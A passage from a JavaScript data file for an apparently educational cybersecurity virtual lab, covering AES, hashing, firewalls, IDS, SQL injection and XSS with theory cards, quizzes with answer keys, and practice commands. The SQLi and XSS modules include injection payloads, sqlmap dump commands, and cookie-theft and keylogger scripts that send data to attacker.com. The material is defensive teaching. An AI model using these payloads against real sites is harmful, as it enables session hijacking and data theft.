                "content": "AES-128 expands 128-bit key into 11 x 128-bit round keys:\n• W[0..3]: Original 128-bit key split into 4x32-bit words\n• W[i] = W[i-4] XOR g(W[i-1]) for i multiple of 4\n  g() = RotWord + SubWord (S-Box each byte) + XOR RCON\n• W[i] = W[i-4] XOR W[i-1] otherwise\n\nKey avalanche: 1-bit key change changes ~50% of all round keys."
            },
            {
                "title": "3. AES Modes of Operation",
                "content": "• ECB: Same block = same ciphertext. INSECURE (reveals patterns)\n• CBC: XOR each block with previous ciphertext. Random IV needed\n• CTR: Converts AES to stream cipher. XOR with AES(counter). Parallelizable\n• GCM: CTR + authentication tag. Provides AEAD (Authenticated Encryption)\n\nRecommended: AES-256-GCM for modern applications"
            },
            {
                "title": "4. AES Security",
                "content": "Best known attacks on AES:\n• Brute force AES-128: 2^128 operations (completely infeasible)\n• Related-key attacks: Theoretical, not practical\n• Cache-timing attacks: Implementation-specific\n• Biclique attack: AES-128 reduced to 2^126 (negligible improvement)\n\nPost-quantum: AES-256 remains secure (Grover's reduces to 2^128)."
            }
        ]
    },
    "pretest": [
        {
            "q": "AES operates on blocks of:",
            "options": [
                "64 bits",
                "128 bits",
                "256 bits",
                "512 bits"
            ],
            "correct": 1
        },
        {
            "q": "How many rounds does AES-128 perform?",
            "options": [
                "8",
                "10",
                "12",
                "14"
            ],
            "correct": 1
        },
        {
            "q": "The SubBytes transformation provides:",
            "options": [
                "Diffusion",
                "Confusion through non-linear S-Box substitution",
                "Key mixing",
                "Row permutation"
            ],
            "correct": 1
        },
        {
            "q": "AES-GCM mode provides:",
            "options": [
                "Encryption only",
                "Authentication only",
                "Both encryption and authentication (AEAD)",
                "Compression and encryption"
            ],
            "correct": 2
        },
        {
            "q": "ECB mode is insecure because:",
            "options": [
                "It is too slow",
                "Identical plaintext blocks produce identical ciphertext blocks, revealing patterns",
                "It uses a fixed IV",
                "It requires a 512-bit key"
            ],
            "correct": 1
        }
    ],
    "procedure": [
        "1. Enter a 128-bit key and 128-bit plaintext block (hex).",
        "2. Step through AES round 1: observe SubBytes, ShiftRows, MixColumns, AddRoundKey on the 4x4 state.",
        "3. View the key schedule expansion — 11 round keys derived from original key.",
        "4. Compare ECB vs CBC mode: encrypt a repeating pattern and observe the difference.",
        "5. Demonstrate GCM: encrypt with auth tag — tamper with ciphertext and watch tag verification fail."
    ],
    "posttest": [
        {
            "q": "MixColumns in AES provides:",
            "options": [
                "Non-linear byte substitution",
                "Diffusion by mixing bytes within each column using matrix multiplication in GF(2^8)",
                "Key schedule expansion",
                "Row cyclic shifts"
            ],
            "correct": 1
        },
        {
            "q": "An initialization vector (IV) in CBC mode must be:",
            "options": [
                "The same for all messages",
                "A secret value kept with the key",
                "Random and unpredictable for each message",
                "The first 16 bytes of the key"
            ],
            "correct": 2
        },
        {
            "q": "Counter (CTR) mode makes AES suitable for:",
            "options": [
                "Only block-aligned data",
                "Stream encryption with parallel processing (no feedback dependency)",
                "Authentication without encryption",
                "Hash computation"
            ],
            "correct": 1
        },
        {
            "q": "An authenticated encryption scheme prevents:",
            "options": [
                "Brute force attacks on the key",
                "Undetected ciphertext tampering (ensures integrity and authenticity)",
                "Replay attacks alone",
                "Side-channel timing attacks"
            ],
            "correct": 1
        },
        {
            "q": "AES S-Box is designed to provide maximum:",
            "options": [
                "Linear correlation between input and output",
                "Non-linearity to minimize algebraic simplification by attackers",
                "Compression",
                "Speed on 8-bit processors"
            ],
            "correct": 1
        }
    ],
    "simType": "cyber_aes",
    "practice_commands": [
        "openssl enc -aes-256-cbc -in plain.txt -out cipher.bin -k password -pbkdf2",
        "openssl enc -d -aes-256-cbc -in cipher.bin -out plain.txt -k password -pbkdf2"
    ],
    "practice_questions": [
        "Show why ECB mode is insecure by encrypting 2 identical 16-byte blocks and observing the ciphertext.",
        "Explain the padding oracle attack on AES-CBC and how AES-GCM prevents it."
    ]
};

window.VLAB_DATA.cyber_hashing = {
    "title": "Hashing Algorithms & Message Integrity",
    "aim": "To understand cryptographic hash functions, compare MD5, SHA-1, SHA-256, and SHA-3, demonstrate the avalanche effect, and implement HMAC for message authentication.",
    "theory": {
        "intro": "A cryptographic hash function maps arbitrary-length input to a fixed-length digest. They are one-way (preimage resistant), collision resistant, and exhibit the avalanche effect. Used in password storage, digital signatures, blockchain, and message authentication.",
        "cards": [
            {
                "title": "1. Hash Function Properties",
                "content": "1. Deterministic: Same input → same output\n2. Fixed output size: MD5=128b, SHA-1=160b, SHA-256=256b\n3. Preimage resistance: Given H(x), infeasible to find x\n4. Second preimage resistance: Given x, infeasible to find x' != x with H(x)=H(x')\n5. Collision resistance: Infeasible to find any x,x' where H(x)=H(x')\n6. Avalanche effect: 1-bit input change → ~50% output bits change"
            },
            {
                "title": "2. Algorithm Comparison",
                "content": "MD5 (1992): 128-bit, broken for collisions (2004)\n  Two different files can have same MD5 — still used for non-security checksums\n\nSHA-1 (1995): 160-bit, collision found 2017 (SHAttered)\n  Deprecated in TLS certificates\n\nSHA-256 (2001): 256-bit, currently secure\n  Used in TLS, Bitcoin, code signing\n\nSHA-3 (Keccak, 2012): Sponge construction\n  Not vulnerable to length-extension attacks"
            },
            {
                "title": "3. Password Hashing",
                "content": "Never store plain passwords! Store H(password).\n\nProblem: Rainbow tables precompute H(common_passwords)\nSolution: Salt — append random string before hashing\n  H(password || salt) — unique per user\n\nPassword-specific hash functions (slow by design):\n• bcrypt: Built-in salt, configurable work factor\n• Argon2 (PHC winner): Memory-hard, resists GPU/ASIC\n• PBKDF2: HMAC-SHA256 iterated N times (WPA2, LUKS)"
            },
            {
                "title": "4. HMAC",
                "content": "HMAC(K, M) = H((K xor opad) || H((K xor ipad) || M))\n\nProvides:\n• Authenticity: Only someone with secret key K produces valid HMAC\n• Integrity: Any change to message M changes HMAC\n\nUses:\n• TLS record layer: HMAC-SHA256\n• JWT: HMAC-SHA256 signature\n• API authentication: HMAC of request body + timestamp\n• AWS SigV4: HMAC chain for request signing"
            }
        ]
    },
    "pretest": [
        {
            "q": "The avalanche effect in hash functions means:",
            "options": [
                "Output size grows with input",
                "A 1-bit input change causes approximately 50% of output bits to change",
                "Hash computation time increases exponentially",
                "Only large inputs produce avalanche"
            ],
            "correct": 1
        },
        {
            "q": "MD5 is considered broken because:",
            "options": [
                "It is too slow",
                "Practical collision attacks exist (two different inputs with same MD5)",
                "Its output is too long",
                "It requires a secret key"
            ],
            "correct": 1
        },
        {
            "q": "Password salting prevents:",
            "options": [
                "Brute force attacks entirely",
                "Rainbow table attacks by making each hash unique per user",
                "Timing attacks",
                "SQL injection"
            ],
            "correct": 1
        },
        {
            "q": "HMAC provides:",
            "options": [
                "Encryption of the message",
                "Authentication and integrity verification using a shared secret key",
                "Non-repudiation without a secret key",
                "Compression of the message"
            ],
            "correct": 1
        },
        {
            "q": "SHA-256 produces a digest of:",
            "options": [
                "128 bits",
                "160 bits",
                "256 bits",
                "512 bits"
            ],
            "correct": 2
        }
    ],
    "procedure": [
        "1. Enter text and hash it with MD5, SHA-1, SHA-256, SHA-3 — compare output sizes.",
        "2. Change one character in the input and re-hash — observe the avalanche effect.",
        "3. Demonstrate MD5 collision: view two different files with the same MD5 hash.",
        "4. Implement password hashing: add salt and hash — show rainbow table defeat.",
        "5. Compute HMAC-SHA256 — tamper with message and verify HMAC fails."
    ],
    "posttest": [
        {
            "q": "Length extension attack is possible on:",
            "options": [
                "SHA-3",
                "HMAC",
                "SHA-256 (Merkle-Damgard construction)",
                "bcrypt"
            ],
            "correct": 2
        },
        {
            "q": "Argon2 is preferred over bcrypt for new applications because:",
            "options": [
                "It is faster",
                "It is memory-hard, resisting GPU and ASIC brute-force attacks",
                "It produces longer hashes",
                "It does not require salting"
            ],
            "correct": 1
        },
        {
            "q": "The birthday attack on hash functions means collision probability reaches 50% at approximately:",
            "options": [
                "2^n attempts",
                "2^(n/2) attempts (birthday paradox)",
                "2^(n/4) attempts",
                "n attempts"
            ],
            "correct": 1
        },
        {
            "q": "SHA-3 sponge construction prevents:",
            "options": [
                "Using a Feistel network",
                "Length extension attacks (unlike Merkle-Damgard used by SHA-2)",
                "Being much faster than SHA-2",
                "Using the same core as AES"
            ],
            "correct": 1
        },
        {
            "q": "PBKDF2 with 100,000 iterations makes password hashing slower to:",
            "options": [
                "Improve user experience",
                "Increase brute-force cost proportionally for attackers",
                "Reduce server load",
                "Improve collision resistance"
            ],
            "correct": 1
        }
    ],
    "simType": "cyber_hashing",
    "practice_commands": [
        "echo -n 'Hello World' | sha256sum",
        "echo -n 'Hello World' | md5sum",
        "openssl dgst -sha256 -hmac 'secret_key' message.txt"
    ],
    "practice_questions": [
        "Given two files with the same MD5 hash, explain how this breaks digital signature schemes using MD5.",
        "Calculate the cost increase for an attacker when PBKDF2 iterations increase from 10,000 to 1,000,000."
    ]
};

window.VLAB_DATA.cyber_firewall = {
    "title": "Firewall Rule Engine",
    "aim": "To understand stateful and stateless firewall operation, write packet filter rules, observe rule evaluation order, and configure firewall policies for common attack scenarios.",
    "theory": {
        "intro": "A firewall monitors and controls incoming/outgoing network traffic based on security rules. Modern firewalls operate at multiple OSI layers and perform deep packet inspection, application-layer filtering, and stateful connection tracking.",
        "cards": [
            {
                "title": "1. Stateless vs Stateful Firewalls",
                "content": "Stateless (Packet Filter):\n• Evaluates each packet independently against rules\n• Rules: Source IP, Dest IP, Protocol, Port, Interface\n• Cannot track connection state\n• Example: AWS NACL\n\nStateful (Connection Tracking):\n• Tracks TCP connection state (SYN, ESTABLISHED, FIN)\n• Automatically allows return traffic for established connections\n• Example: AWS Security Groups, Cisco ASA\n• More secure: rejects packets with invalid state"
            },
            {
                "title": "2. Rule Processing Order",
                "content": "Firewalls process rules top-to-bottom, first-match wins:\n\nRule 1: ALLOW TCP dst:port 80\nRule 2: ALLOW TCP dst:port 443\nRule 3: ALLOW TCP src:192.168.1.0/24 dst:port 22\nRule 4: DENY TCP dst:port 22\nRule 5: DENY ALL (implicit deny)\n\nIf DENY ALL is before ALLOW rules — nothing passes!\nOrder matters critically for correct policy."
            },
            {
                "title": "3. Common Firewall Policies",
                "content": "DMZ (Demilitarized Zone) architecture:\n• Internet -> External Firewall -> DMZ (web/mail servers)\n• DMZ -> Internal Firewall -> LAN (databases)\n• DMZ servers receive internet traffic but cannot access LAN\n\nCommon rules:\n• Block private IPs from internet (RFC 1918)\n• Block Smurf attacks: deny ICMP broadcasts\n• Block Null scans: deny TCP packets with no flags\n• Rate-limit ICMP: prevent ping flood DoS"
            },
            {
                "title": "4. iptables Syntax",
                "content": "iptables -A INPUT -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -p tcp --dport 22 -s 192.168.1.0/24 -j ACCEPT\niptables -A INPUT -p tcp --dport 22 -j DROP\niptables -A INPUT -m conntrack --ctstate ESTABLISHED -j ACCEPT\niptables -P INPUT DROP  # default policy\n\nChains: INPUT, OUTPUT, FORWARD\nTargets: ACCEPT, DROP, REJECT, LOG, MASQUERADE"
            }
        ]
    },
    "pretest": [
        {
            "q": "A stateful firewall tracks:",
            "options": [
                "Source IP addresses only",
                "TCP/UDP connection states to allow return traffic",
                "All web URLs",
                "Only ICMP packets"
            ],
            "correct": 1
        },
        {
            "q": "Firewall rules are processed:",
            "options": [
                "Randomly",
                "In parallel",
                "Top-to-bottom with first-match winning",
                "Bottom-to-top"
            ],
            "correct": 2
        },
        {
            "q": "A DMZ network segment is used for:",
            "options": [
                "Blocking all external traffic",
                "Hosting servers needing internet access while protecting internal LAN",
                "Internal database servers",
                "VPN termination only"
            ],
            "correct": 1
        },
        {
            "q": "An implicit DENY ALL rule at the end:",
            "options": [
                "Is optional",
                "Ensures any traffic not explicitly allowed is blocked",
                "Allows all traffic by default",
                "Only applies to outbound traffic"
            ],
            "correct": 1
        },
        {
            "q": "AWS Security Groups are:",
            "options": [
                "Stateless packet filters",
                "Stateful firewalls tracking connection state",
                "Network ACLs",
                "Route tables"
            ],
            "correct": 1
        }
    ],
    "procedure": [
        "1. View the simulated network: Internet, Firewall, DMZ, Internal LAN.",
        "2. Write Allow rules for HTTP (80), HTTPS (443), and SSH from specific IP.",
        "3. Add a default Deny All rule — test various traffic types against the ruleset.",
        "4. Send a TCP SYN scan — observe stateful firewall blocking invalid state.",
        "5. Configure a DMZ policy: web server accessible from internet, blocked from LAN."
    ],
    "posttest": [
        {
            "q": "An ingress filter blocking private IP ranges from the internet prevents:",
            "options": [
                "Port scanning",
                "IP spoofing attacks using private source addresses",
                "DDoS attacks",
                "SQL injection"
            ],
            "correct": 1
        },
        {
            "q": "Deep Packet Inspection (DPI) differs from packet filtering by:",
            "options": [
                "Operating at Layer 3 only",
                "Inspecting the application-layer payload content (Layer 7)",
                "Tracking connection states",
                "Using hardware acceleration"
            ],
            "correct": 1
        },
        {
            "q": "A Next-Generation Firewall (NGFW) adds:",
            "options": [
                "Only faster processing",
                "Application identification, IPS, SSL inspection, and user-based policies",
                "More physical interfaces",
                "Larger rule tables"
            ],
            "correct": 1
        },
        {
            "q": "The iptables REJECT target differs from DROP by:",
            "options": [
                "Being faster",
                "Sending an error response to the sender (RST or ICMP unreachable)",
                "Logging all dropped packets",
                "Only working for UDP"
            ],
            "correct": 1
        },
        {
            "q": "Zero-trust network architecture differs from traditional perimeter firewall by:",
            "options": [
                "Having no firewall",
                "Trusting no traffic by default — every access is authenticated and authorized",
                "Only allowing IPv6",
                "Using physical security only"
            ],
            "correct": 1
        }
    ],
    "simType": "cyber_firewall",
    "practice_commands": [
        "iptables -A INPUT -p tcp --dport 443 -j ACCEPT",
        "iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT",
        "iptables -P INPUT DROP",
        "iptables -L -n -v --line-numbers"
    ],
    "practice_questions": [
        "Write a complete iptables ruleset for a web server: allow HTTP/HTTPS from internet, SSH only from 10.0.0.0/8, block everything else.",
        "Explain how a stateful firewall handles a TCP three-way handshake vs an unsolicited ACK packet."
    ]
};

window.VLAB_DATA.cyber_ids = {
    "title": "Intrusion Detection System (IDS)",
    "aim": "To understand signature-based and anomaly-based IDS operation, analyze simulated network traffic for attack patterns, and write Snort-style detection rules.",
    "theory": {
        "intro": "An IDS monitors network traffic for signs of malicious activity, generating alerts when threats are detected. Unlike firewalls, IDS operates passively. An IPS (Intrusion Prevention System) actively blocks detected threats inline.",
        "cards": [
            {
                "title": "1. Signature vs Anomaly Detection",
                "content": "Signature-based (Misuse Detection):\n• Compares traffic against known attack signatures\n• Excellent accuracy for known attacks\n• Cannot detect zero-day attacks\n• Tools: Snort, Suricata\n\nAnomaly-based (Behavior Detection):\n• Establishes baseline of normal traffic\n• Alerts when deviations from baseline occur\n• Can detect zero-day attacks\n• Higher false positive rate\n• Tools: Darktrace, ML-based SIEM"
            },
            {
                "title": "2. Snort Rule Syntax",
                "content": "Format: action proto src_ip src_port dir dst_ip dst_port (options)\n\nExamples:\n  alert tcp any any -> any 80 (msg:\"HTTP GET scan\"; content:\"GET /admin\"; sid:1001;)\n  alert icmp any any -> 192.168.1.0/24 any (msg:\"Ping Flood\"; threshold:type both,track by_src,count 100,seconds 1; sid:1002;)\n\nactions: alert, log, pass, drop, reject"
            },
            {
                "title": "3. IDS Placement",
                "content": "Network IDS (NIDS): Monitors network traffic\n• Placed on SPAN/mirror port of switch\n• Cannot see encrypted TLS traffic without decryption proxy\n\nHost IDS (HIDS): Monitors a single host\n• Monitors system calls, file changes, log entries\n• Can see post-decryption data\n• Examples: OSSEC, Wazuh, Auditd\n\nSIEM: Aggregates alerts from NIDS + HIDS\n• Examples: Splunk, IBM QRadar, Microsoft Sentinel"
            },
            {
                "title": "4. True/False Positives & Negatives",
                "content": "• True Positive (TP): Attack detected correctly\n• False Positive (FP): Normal traffic flagged as attack\n• False Negative (FN): Attack not detected\n• True Negative (TN): Normal traffic correctly passed\n\nPrecision = TP / (TP + FP)\nRecall = TP / (TP + FN)\n\nHigh FP rate → alert fatigue (analysts ignore alerts)\nHigh FN rate → attackers slip through"
            }
        ]
    },
    "pretest": [
        {
            "q": "An IDS differs from a firewall in that:",
            "options": [
                "IDS blocks traffic while firewall only detects",
                "IDS monitors and alerts passively without blocking traffic",
                "IDS requires dedicated hardware",
                "IDS operates only at Layer 7"
            ],
            "correct": 1
        },
        {
            "q": "A false positive in IDS means:",
            "options": [
                "An attack was detected and blocked",
                "Normal traffic was incorrectly flagged as malicious",
                "An attack went undetected",
                "Two alerts for the same attack"
            ],
            "correct": 1
        },
        {
            "q": "Signature-based IDS cannot detect:",
            "options": [
                "SQL injection attacks",
                "Port scans",
                "Zero-day exploits with no existing signature",
                "Known malware"
            ],
            "correct": 2
        },
        {
            "q": "A SPAN port (mirror port) is used to:",
            "options": [
                "Block malicious traffic",
                "Copy network traffic to the IDS without interrupting flow",
                "Encrypt network traffic",
                "Route traffic through IDS inline"
            ],
            "correct": 1
        },
        {
            "q": "SIEM systems provide:",
            "options": [
                "Standalone intrusion prevention",
                "Centralized log collection and correlation of alerts from multiple sources",
                "Physical network monitoring only",
                "Application-layer firewalling"
            ],
            "correct": 1
        }
    ],
    "procedure": [
        "1. Load a packet capture containing mixed normal and attack traffic.",
        "2. Apply signature rules — observe TP alerts for SQL injection and port scan patterns.",
        "3. Observe FP alerts — normal HTTPS traffic misidentified by overly broad rule.",
        "4. Write a custom Snort rule to detect a specific attack pattern.",
        "5. Compare signature vs anomaly detection: run an unknown attack — observe FN in signature, TP in anomaly mode."
    ],
    "posttest": [
        {
            "q": "Protocol anomaly detection flags traffic that:",
            "options": [
                "Matches known attack signatures",
                "Violates RFC protocol specifications (malformed HTTP headers)",
                "Comes from blacklisted IPs",
                "Contains encryption"
            ],
            "correct": 1
        },
        {
            "q": "An IPS differs from IDS by:",
            "options": [
                "Using more CPU",
                "Being deployed inline to actively block detected attacks",
                "Using only signature detection",
                "Operating at Layer 2 only"
            ],
            "correct": 1
        },
        {
            "q": "Alert fatigue in a SOC is caused by:",
            "options": [
                "Too few security alerts",
                "Excessive false positive alerts overwhelming analysts",
                "Encrypted traffic",
                "Insufficient bandwidth"
            ],
            "correct": 1
        },
        {
            "q": "Suricata improves on Snort by:",
            "options": [
                "Using fewer rules",
                "Supporting multi-threading for high-speed network detection",
                "Operating only at Layer 3",
                "Using only anomaly detection"
            ],
            "correct": 1
        },
        {
            "q": "The Cyber Kill Chain model helps IDS by:",
            "options": [
                "Providing firewall rules",
                "Mapping attack stages (Reconnaissance to Exfiltration) to detection points",
                "Generating encryption keys",
                "Automating patch management"
            ],
            "correct": 1
        }
    ],
    "simType": "cyber_ids",
    "practice_commands": [
        "snort -r capture.pcap -c /etc/snort/snort.conf -A console",
        "suricata -r traffic.pcap -l /var/log/suricata/",
        "grep 'ALERT' /var/log/snort/alert | awk '{print $NF}' | sort | uniq -c | sort -rn | head -20"
    ],
    "practice_questions": [
        "Write a Snort rule to detect an NMAP SYN scan (TCP packets with only SYN flag, no established connection).",
        "Calculate the precision and recall of an IDS that produces 80 TP, 200 FP, and misses 20 attacks (20 FN)."
    ]
};

window.VLAB_DATA.cyber_sql_inject = {
    "title": "SQL Injection Attack & Defense",
    "aim": "To understand SQL injection vulnerabilities, demonstrate classic and blind SQL injection attacks, and implement parameterized queries as the primary defense.",
    "theory": {
        "intro": "SQL Injection (SQLi) is consistently the #1 web application vulnerability (OWASP Top 10). It occurs when user-supplied input is directly concatenated into SQL queries without sanitization, allowing attackers to manipulate query logic.",
        "cards": [
            {
                "title": "1. Classic SQL Injection",
                "content": "Vulnerable PHP code:\n  $query = \"SELECT * FROM users WHERE username='\" . $_GET['user'] . \"'\";\n\nAttacker input: ' OR '1'='1\nResulting query: SELECT * FROM users WHERE username='' OR '1'='1'\n→ Always true! Returns all users → Authentication bypass.\n\nExtract data:\n  ' UNION SELECT username,password,3 FROM users --"
            },
            {
                "title": "2. Types of SQL Injection",
                "content": "In-Band SQLi:\n• Error-based: Force DB error messages leaking schema info\n• UNION-based: Append UNION SELECT to extract data\n\nBlind SQLi (no direct output):\n• Boolean-based: Ask true/false questions\n  ' AND SUBSTRING(password,1,1)='a' --\n• Time-based: ' AND SLEEP(5) -- (if response delays 5s)\n\nOut-of-Band SQLi:\n• DNS/HTTP exfiltration via DB functions"
            },
            {
                "title": "3. Defense — Parameterized Queries",
                "content": "The ONLY reliable defense:\n\nVulnerable:\n  query = 'SELECT * FROM users WHERE id=' + user_input\n\nSecure (Python):\n  cursor.execute('SELECT * FROM users WHERE id = %s', (user_input,))\n\nSecure (Java):\n  stmt = conn.prepareStatement('SELECT * FROM users WHERE id = ?');\n  stmt.setInt(1, userId);\n\nThe DB driver separates code from data — input cannot change query structure."
            },
            {
                "title": "4. Additional Defenses",
                "content": "Defense-in-depth (parameterized queries are mandatory + these help):\n• Input validation: Whitelist expected format\n• Principle of least privilege: DB user only has SELECT, not DROP\n• WAF (Web Application Firewall): Block known SQLi patterns\n• Error handling: Never expose DB error messages to users\n• ORMs (Django, Hibernate): Use parameterized queries internally\n\nBlacklist/escape alone is INSUFFICIENT."
            }
        ]
    },
    "pretest": [
        {
            "q": "SQL Injection occurs when:",
            "options": [
                "Database is accessed over unencrypted connection",
                "User input is directly concatenated into SQL queries without sanitization",
                "Too many database connections are open",
                "Database passwords are weak"
            ],
            "correct": 1
        },
        {
            "q": "The input ' OR '1'='1 in a login form causes:",
            "options": [
                "A syntax error",
                "Authentication bypass by making the WHERE clause always true",
                "Deletion of all records",
                "An encrypted query"
            ],
            "correct": 1
        },
        {
            "q": "The most reliable defense against SQL injection is:",
            "options": [
                "Input length limits",
                "Parameterized queries / prepared statements",
                "WAF rules only",
                "Encrypting the database"
            ],
            "correct": 1
        },
        {
            "q": "Blind SQL injection is used when:",
            "options": [
                "Application shows full error messages",
                "Application does not return query results directly but reveals behavioral differences",
                "The database has no sensitive data",
                "The attacker has database credentials"
            ],
            "correct": 1
        },
        {
            "q": "UNION-based SQL injection requires:",
            "options": [
                "The same number of columns as the original query",
                "Admin database credentials",
                "A time delay",
                "SSL certificate validation"
            ],
            "correct": 0
        }
    ],
    "procedure": [
        "1. Access the vulnerable login form — test with legitimate credentials.",
        "2. Inject ' OR '1'='1' -- into the username field — observe authentication bypass.",
        "3. Use UNION SELECT to extract usernames and password hashes.",
        "4. Perform time-based blind SQLi: use SLEEP() to infer data character by character.",
        "5. Fix the vulnerability: switch to parameterized queries — verify attacks no longer work."
    ],
    "posttest": [
        {
            "q": "Second-order (stored) SQL injection occurs when:",
            "options": [
                "SQL is injected and immediately executed",
                "Malicious input is stored safely, then used unsafely in a later query",
                "The database has two tables",
                "SQL is executed twice with the same parameters"
            ],
            "correct": 1
        },
        {
            "q": "NoSQL injection targets:",
            "options": [
                "Only relational databases",
                "Non-relational databases (MongoDB, Redis) with operator injection like $where",
                "Only Oracle databases",
                "Requiring admin credentials"
            ],
            "correct": 1
        },
        {
            "q": "Error-based SQL injection extracts data by:",
            "options": [
                "Causing application crashes",
                "Making the database include sensitive data in error messages",
                "Timing database responses",
                "Using UNION SELECT"
            ],
            "correct": 1
        },
        {
            "q": "The sqlmap tool automates:",
            "options": [
                "SQL query optimization",
                "Detection and exploitation of SQL injection vulnerabilities",
                "Database backup creation",
                "SQL stored procedure generation"
            ],
            "correct": 1
        },
        {
            "q": "Principle of least privilege for database accounts means:",
            "options": [
                "Using strong passwords",
                "Granting only the minimum permissions needed (only SELECT, not DROP)",
                "Encrypting database connections",
                "Rotating database passwords weekly"
            ],
            "correct": 1
        }
    ],
    "simType": "cyber_sql_inject",
    "practice_commands": [
        "sqlmap -u 'http://target.com/login?id=1' --dbs",
        "sqlmap -u 'http://target.com/page?id=1' -D webdb -T users --dump"
    ],
    "practice_questions": [
        "Write a Python script using sqlite3 that demonstrates the difference between a vulnerable query and a parameterized query.",
        "Identify and fix: query = 'DELETE FROM posts WHERE id=' + request.args.get('id')"
    ]
};

window.VLAB_DATA.cyber_xss = {
    "title": "Cross-Site Scripting (XSS)",
    "aim": "To understand reflected, stored, and DOM-based XSS vulnerabilities, demonstrate cookie theft, and implement CSP and output encoding defenses.",
    "theory": {
        "intro": "XSS is a client-side code injection attack where malicious scripts are injected into web pages. XSS allows attackers to steal session cookies, perform actions on behalf of users, deface websites, or install keyloggers. Consistently in OWASP Top 10.",
        "cards": [
            {
                "title": "1. Types of XSS",
                "content": "Reflected XSS (Non-persistent):\n  Server reflects user input without sanitization.\n  Attacker URL: site.com/search?q=<script>steal()</script>\n  Victim clicks malicious link → script runs in browser\n\nStored XSS (Persistent):\n  Script stored in database (comments, posts).\n  Every user viewing content executes attacker's script.\n  More dangerous — no social engineering needed.\n\nDOM-based XSS:\n  JS reads from URL/storage and writes to DOM unsafely.\n  document.write(location.hash) is dangerous"
            },
            {
                "title": "2. XSS Attack Payloads",
                "content": "Cookie theft:\n  <script>document.location='http://attacker.com/steal?c='+document.cookie</script>\n\nKeylogger:\n  <script>document.addEventListener('keydown',function(e){new Image().src='http://attacker.com/key?k='+e.key})</script>\n\nBypass filters:\n  <img src=x onerror=alert(1)>   ← no script tag\n  <svg onload=alert(1)>          ← SVG events\n  javascript:alert(1)            ← in href attribute"
            },
            {
                "title": "3. Defense — Output Encoding",
                "content": "Encode all user-controlled data before inserting into HTML:\n• HTML: < → &lt;  > → &gt;  & → &amp;  \" → &quot;\n• JavaScript: ' → \\', \" → \\\"\n• URL: < → %3C\n\nContext matters — use the right encoding:\n  HTML body: HTML encode\n  JS variables: JavaScript encode\n  URL params: URL encode\n\nLibraries: OWASP Java Encoder, DOMPurify (client-side), Python html.escape()"
            },
            {
                "title": "4. Content Security Policy (CSP)",
                "content": "CSP HTTP header restricts which scripts the browser executes:\n  Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com;\n\n• Blocks inline scripts (<script>alert(1)</script>)\n• Blocks eval() and dynamic code execution\n• Only allows scripts from specified domains\n\nStrict CSP with nonces:\n  script-src 'nonce-random123'\n  <script nonce=\"random123\"> ← only this tag executes\n\nCSP defeats most XSS by making stolen script sources ineffective."
            }
        ]
    },
    "pretest": [
        {
            "q": "Stored XSS is more dangerous than reflected XSS because:",
            "options": [
                "It uses different payloads",
                "The malicious script is permanently stored and executes for every visitor",
                "It bypasses firewalls",
                "It targets server-side code"
            ],
            "correct": 1
        },
        {
            "q": "XSS cookie theft allows an attacker to:",
            "options": [
                "Change the victim's password directly",
                "Steal the session cookie and impersonate the victim",
                "Delete the website database",
                "Read other users' files"
            ],
            "correct": 1
        },
        {
            "q": "HTML output encoding converts '<' to:",
            "options": [
                "(lt)",
                "[less]",
                "&lt;",
                "\\u003C"
            ],
            "correct": 2
        },
        {
            "q": "Content Security Policy (CSP) prevents XSS by:",
            "options": [
                "Encrypting all JavaScript",
                "Restricting which scripts the browser is allowed to execute",
                "Blocking all external requests",
                "Validating form inputs"
            ],
            "correct": 1
        },
        {
            "q": "DOM-based XSS occurs when:",
            "options": [
                "Server reflects unsanitized input",
                "Client-side JavaScript writes attacker-controlled data to the DOM unsafely",
                "SQL queries are injected",
                "Cookies are stolen"
            ],
            "correct": 1
        }
    ],
    "procedure": [
        "1. Find the vulnerable comment field — inject: <script>alert('XSS')</script>",
        "2. Observe stored XSS: the payload executes for every user viewing the page.",
        "3. Demonstrate cookie theft: inject payload that sends document.cookie to attacker server.",
        "4. Apply HTML encoding to the output — verify payload renders as text, not executed.",
        "5. Add a Content-Security-Policy header — verify inline scripts are blocked."
    ],
    "posttest": [
        {
            "q": "The HttpOnly cookie flag prevents XSS cookie theft by:",
            "options": [
                "Encrypting the cookie value",
                "Making the cookie inaccessible to JavaScript (document.cookie cannot read it)",
                "Requiring HTTPS for cookies",
                "Rotating cookies every hour"
            ],
            "correct": 1
        },
        {
            "q": "The SameSite=Strict cookie attribute prevents:",
            "options": [
                "XSS attacks",
                "CSRF attacks by blocking cookie sending on cross-site requests",
                "Cookie hijacking over HTTP",
                "SQL injection via cookies"
            ],
            "correct": 1
        },
        {
            "q": "DOMPurify sanitizes HTML by:",
            "options": [
                "Generating CSP headers",
                "Removing dangerous tags and attributes before insertion into DOM",
                "Encrypting DOM elements",
                "Validating URL parameters"
            ],
            "correct": 1
        },
        {
            "q": "Mutation XSS (mXSS) bypasses sanitization by:",
            "options": [
                "Using Unicode characters",
                "Exploiting browser HTML parsing differences that transform safe markup into executable script",
                "Using CSS instead of JavaScript",
                "Encoding payloads in Base64"
            ],
            "correct": 1
        },
        {
            "q": "Subresource Integrity (SRI) protects against CDN compromise by:",
            "options": [
                "Encrypting CDN traffic",
                "Verifying the cryptographic hash of external scripts before execution",
                "Blocking all CDN scripts",
                "Caching scripts locally"
            ],
            "correct": 1
        }
    ],
    "simType": "cyber_xss",
    "practice_commands": [
        "python3 -c \"import html; print(html.escape('<script>alert(1)</script>'))\"",
        "Header set Content-Security-Policy \"default-src 'self'; script-src 'nonce-abc123'\""
    ],
    "practice_questions": [
        "Design a Content Security Policy allowing your own scripts, Google Analytics, and Bootstrap CDN while blocking inline scripts.",
        "Write a JavaScript function that safely inserts user content into the DOM without XSS risk."
    ]
};

window.VLAB_DATA.cyber_mitm = {
    "title": "Man-in-the-Middle (MITM) Attack",
    "aim": "To understand ARP poisoning and HTTPS downgrade MITM attacks, observe intercepted traffic, and implement HTTPS/HSTS/certificate pinning defenses.",
    "theory": {
        "intro": "A MITM attack occurs when an attacker secretly intercepts and potentially alters communications between two parties. MITM attacks can intercept credentials, inject malicious content, and bypass encryption if not properly implemented.",
        "cards": [
            {
                "title": "1. ARP Poisoning",
